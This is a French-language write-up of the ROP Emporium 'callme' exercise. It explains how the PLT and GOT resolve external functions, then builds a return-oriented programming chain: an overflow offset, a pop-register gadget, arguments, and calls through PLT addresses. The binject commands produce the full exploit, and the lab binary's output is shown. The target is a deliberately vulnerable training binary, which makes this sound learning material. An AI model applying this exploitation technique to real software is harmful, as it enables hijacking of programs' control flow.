# callme challenge

Nouveau challenge de ROP emporium, **callme**: https://ropemporium.com/challenge/callme.html.

## La théorie
Le sujet principal de cet exercice est le **PLT**, ou ***P**rocedure **L**inkage **T**able. Quelques sources intéressantes:
- depuis le site de ROP emporium: https://ropemporium.com/guide.html#Appendix%20A
- plus de détails dans ce fabuleux gitbook: https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got

Pour résumer:
> Les fonctions *internes* au programme, définie dans le code de celui-ci, sont intégralmeent compilées, c'est à dire traduite en langage assembleur et copiées dans les sections **.text**/**.code**. <br>
> Les fonctions *externes* sont délégués au **PLT**, qui se traduit par plusieurs emplacements dédiés à la résolution de la fonction. Ce sont les sections **.plt** et **.got**, respectivement **P**rocedure **L**inkage **T**able et **G**lobal **O**ffset **T**able.

### Procedure Linkage Table

Cette section du programme contient des instructions visant à la résolution des symboles *externes*, puis une fois résolu à leur redirection jusqu'à l'address de l'instruction résolue. 

https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/

Bien que **rabin2** fournisse bien plus d'informations sur les sections, **gdb** permet d'afficher plus facilement les addresses et les instructions à l'aide des commandes suivantes:
> info files **//** pour identifier l'addresse des secteurs *plt*, *got* et *got.plt*. <br> 
> x/20i ADDRESS_.plt

Evidemment, dans le cas de la dernière commade, le nombre 20 est complètement arbitraire, et dépend réellement de la quantité de fonctions externes à résoudre. En résumé, la section **.plt** contient:
- PLT[0], qui sont quelques intructions assembleur pour appeler la fonction de résolution (ou *resolver routine*, sous UNIX c'est le *dynamic loader*).
- PLT[N], qui sont toutes les routines (aussi des instructions assembleur) pour charger l'addresse contenue dans la section **.got.plt**. 

C'est très important de comprendre que le code pour ces fonctions externes (avec **@plt**) se décompose en deux:
1. Le code de résolution, dans la section **.plt**.
2. Le code résolu, qui consiste en une simple address dans la section **.got.plt**.

## Global Offset Table.

Queqlues clarifications sur ces sections;

Premièrement oublions complètement la section **.got**, qui contient les addresses des variables globales, qui n'ont strictement rien à voir avec le **PLT**. C'est uniquement la section **.got.plt** qui va nous intéresser. 

Cette dernière est utilisée et modifiée par les instructions de résolution de **.plt**. D'ailleurs, pour chaque élément PLT[N], il existe une addresse relative dans la section **.got.plt**.

Ci-dessous son organisation en mémoire, sachant que ce sont des addresses,leur taille effective est de 8 bytes; donc les offsets sont 0x00, *0x08*, *0x10*, *0x18* etc...:
- *GOT[0]*: contient la première addresse de la section **.dynamic**, qui contient l'information basique requise par le **dynamic linker**, comme l'addresse de la table de symboles, celle de ré-allocation etc...
- *GOT[1]*: contient l'indentifiant pour le **dynamic linker** instancié.
- *GOT[2]*: contient l'addresse d'appel du **dynamic linker** `<_dl_runtime_resolve_xsavec>`.
- *GOT[3]*: contient l'addresse de l'instruction dans la section **.plt** pour la première *fonction externe* à résoudre (ici ce sera \<**printf@plt**>).

## Resolution

Quelques sources:
- https://img-blog.csdnimg.cn/20200208160601515.gif
- https://blog.csdn.net/Ruger008/article/details/107062608

A l'exécution du programme, c'est le **DL** (le *dynamic linker*, sous linux le *ld.so*, ou *ld-linux.so*) qui est responsable de charger et d'initialiser tous les éléments de la table **GOT**. Dans son état initial, il va se charger de remplir les trois premières entrées GOT[0], GOT[1] et GOT[2], puis sera explicitement appelé par les instructions relatives dans **.plt** pour la résolution de toutes les autres addresses GOT[>=3]. 

Imaginons que notre programme contient un appel à la fonction `printf`, voici les étapes relatives au processus de **PLT**:

1. **.code** instruction est un `call <...@plt>`.
2. ça jump sur le code dédié dans PLT[1] (section **.plt**).
3. ça jump à l'addresse contenue dans GOT[3].
4. à ce stade, cette addresse est PLT[1] (après l'instruction du point 2.).
5. ça push 0, l'index de la function à resoudre, dans la stack.
6. ça jump sur PLT[0] pour l'appel de fonction de résolution.
7. ça push la valeur de GOT[1] sur la stack.
8. ça call l'addresse contenue dans GOT[2] (la fonction de résolution, `<_dl_runtime_resolve_xsavec>`).

A ce point là, le symbole est processé par le **DL**, et l'addresse résolue est écrite dans l'élément correspondant dans la section **.got.plt**, ici GOT[3]. 

Ensuite, chaque fois que `printf@plt` sera appelé, au lieu de brancher sur PLT[1] au point *3.*, GOT[3] contiendra l'addresse résolue, et le code jumpera sur le **vrai** code de la fonction.

## Le challenge (enfin)

1. wget https://ropemporium.com/binary/callme.zip (*pour télécharger le challenge*)
2. unzip callme.zip (*pour décompresser le challenge*)
3. checksec callme (*pour vérifier la sécurité de l'executable*)
4. rabin2 -z callme (*pour chercher des chaînes de caractères utilisées par l'executable*)

5. gdb callme
	1. info function nous donne quelques fonctions:
		- pwnme (la même fonction vulnérable que *ret2win*).
		- usefulFunction (qui contient les trois autres fonctions).
		- callme_one/two/three avec ***@plt***.

L'énoncé du challenge parle d'*inccorect calls* à ces trois dernières fonctions. J'imagine que cela fait référence à la `usefulFunction`, qui ne pourra donc pas être appelé préalablement pour résoudre les fonctions `call_me` avant de faire l'exploit. Nous utiliserons plutôt la méthode *conventionelle* qui consiste à jumper directement sur la section **.plt** pour résoudre ces fonctions.

Toujours avec **gdb**:
1. info files (*pour retrouver l'addresse des différentes sections*)
2. x/20i 0x00000000004006c0 (*avec l'addresse de la section .plt*)
3. A ce point, les symboles ne sont pas encore résolus, mais nous pouvons au minimum identifier les addresses dans la section **.plt**:
	- 0x400720 <callme_one@plt>:   jmp    *0x20091a(%rip)        # 0x601040 <callme_one@got.plt>
	- 0x400740 <callme_two@plt>:   jmp    *0x20090a(%rip)        # 0x601050 <callme_two@got.plt>
	- 0x4006f0 <callme_three@plt>: jmp    *0x200932(%rip)        # 0x601028 <callme_three@got.plt>

Aussi, ces fonctions nécessitent trois arguments (comme nous pouvons le constater en désassemblant *usefulFunction*), chargés dans les registres `%rdi`, `%rsi` et `%rdx`; un gadget ROP pour `pop`er de la stack jusqu'à ces registres nous permettrait donc d'organiser l'appel de la fonction. Dans l'executable nous avons les instructions de la fonction *usefulGadget*:
> 0x000000000040093c <+0>:&emsp;	pop    %rdi&emsp;	// for 0xdeadbeefdeadbeef <br>
> 0x000000000040093d <+1>:&emsp;    pop    %rsi&emsp; 	// for 0xcafebabecafebabe <br>
> 0x000000000040093e <+2>:&emsp;	pop    %rdx&emsp; 	// for 0xd00df00dd00df00d <br>
> 0x000000000040093f <+3>:&emsp;	ret

Avec ça, nous n'avons même pas besoin d'utiliser **ropper**. Aussi, l'énonce de ROP emporium donne une information particulièrement intéressante vis à vis de l'architecture **x64**, à savoir que les arguments doivent être de 16 bytes, soit 128 bits.

Vérifions tout de même que la fonction **pwnme** admet toujours un buffer vulnérable de 32 bytes avec le **BB** test:
> binject -ns 32 A -x BBBBBBBBBBBBBBBB > test <br>
> tgdb callme <br>
> break *(pwnme+89) // to put a breakpoint at pwnme+89, as the ret instruction <br>
> r < test

La valeur du registre `%rbp` est bien *0xbbbbbbbbbbbbbbbb*, nickel! Maintenant, essayons d'atteindre la fonction `<callme_one@plt>` à travers des instructions de résolution dans la section **.plt**:
> binject -ns 40 A -x 200740 > test <br>
> tgdb callme <br>
> break *0x400720&emsp;//the adress of \<callme_one@plt> from **.plt** section <br>
> continue

Parfait, le *breakpoint* est bien atteint.

## Binject modification
Quelques modifications de l'utilitaire **binject** semblent nécessaires:
- permettre les minuscules dans le cas du flag `-x`.
- un nouveau flag `-x64` afin de pouvoir manipuler les addresses dans le cadre de l'architecture **x64**. Nous assumerons le format *little-endian* et automatiserons le padding s'il est nécessaire.
- un nouveau flag `-of` pour générer l'*output* dans un fichier binaire.
- un nouveau flag `-if` pour lire le contenu dans fichier binaire et l'utiliser dans une nouvelle commande.

Aussi, et dans l'optique d'optimiser le développement, j'ai introduit un mécanisme de test; celui-ci inclut deux vérifications:
1. celle pour les flags de format (`-s`, `-x`, `-ns`, `-nx`) et pour le fichier de sortie (`-of`).
2. celle pour le flag de fichier d'entrée (`-if`) et la sortie console.

Le repository: https://github.com/anarticho/binject.

## La solution

Venons-en aux choses sérieuses; maintenant que nous disposons d'un outil bien sympa, nous allons simplement créer un ensemble de fichier binaires pour chacunes des étapes de la chaîne ROP:
1. Le binaire pour l'overflow:
> binject -of ovf.bin -ns 40 A
2. Le binaire qui contient le ROP gadget pour récupérer les arguments depuis la stack, ainsi que ces mêmes arguments:
> binject -of arg.bin -x64 40093c -x64 deadbeefdeadbeef -x64 cafebabecafebabe -x64 d00df00dd00df00d
3. Ensuite, un binaire pour chaque appel `callme` depuis la section **.plt**:
> binject -of cm1.bin -if arg.bin -x64 400720 <br>
> binject -of cm2.bin -if arg.bin -x64 400740 <br>
> binject -of cm3.bin -if arg.bin -x64 4006f0 <br>
4. On met tout ensemble:
> binject -of ola.bin -if ovf.bin -if cm1.bin -if cm2.bin -if cm3.bin

En fait, j'ai tout mis dans un fichier *.sh* pour éviter d'avoir à regénérer les fichiers à chaque fois:
> ./callme < bin/ola.bin <br>
> callme by ROP Emporium <br>
> x86_64 <br>
> <br>
> Hope you read the instructions... <br>
> <br>
> Thank you! <br>
> callme_one() called correctly <br>
> callme_two() called correctly <br>
> ROPE{a_placeholder_32byte_flag!} <br>
